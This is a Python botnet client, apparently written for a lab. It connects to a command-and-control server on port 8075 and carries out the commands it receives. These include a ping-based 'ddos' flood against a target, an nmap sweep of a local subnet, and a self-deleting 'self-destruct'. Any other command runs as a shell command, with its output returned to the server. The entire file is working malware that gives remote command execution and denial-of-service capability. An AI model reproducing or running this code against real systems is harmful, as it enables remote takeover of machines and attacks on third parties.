import socket
import sys
import platform
import subprocess
import os
import time

# Configuration
server_ip = "127.0.0.1" # Update to your own IP, use ip addr show and look for inet xxx.xxx.xx.x
server_port = 8075

# Connect to the C2 server securely (without SSL)
secure_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    secure_socket.connect((server_ip, server_port))
    print("Connected to C&C Server.")
except Exception as e:
    print(f"Connection failed: {e}")
    sys.exit()

# Function for DDoS
def ddos_target(target_ip):
    for _ in range(1000):
        os.system(f"ping -c 1 {target_ip}")

# Function for network reconnaissance
def scan_network():
    os.system("nmap -sP 192.168.56.0/24")

# Self-destruct mechanism
def self_destruct():
    os.remove(sys.argv[0])
    print("Bot self-destructed.")
    sys.exit()

# Main loop to receive commands
try:
    while True:
        command = secure_socket.recv(1024).decode().strip()
        print(f"Received command: {command}")
        
        if command.lower() == "exit":
            break
        elif command.lower() == "self-destruct":
            self_destruct()
        elif command.lower() == "heartbeat":
            secure_socket.send(f"{platform.node()} is alive".encode())
        elif command.lower().startswith("ddos"):
            target = command.split(" ")[1]
            ddos_target(target)
            secure_socket.send(b"DDoS attack completed.")
        elif command.lower() == "scan-network":
            scan_network()
            secure_socket.send(b"Network scan completed.")
        else:
            # Execute OS-specific commands
            try:
                output = subprocess.getoutput(command)
                secure_socket.send(output.encode())
            except Exception as e:
                secure_socket.send(f"Error executing command: {e}".encode())
except Exception as e:
    print(f"Error: {e}")
finally:
    secure_socket.close()

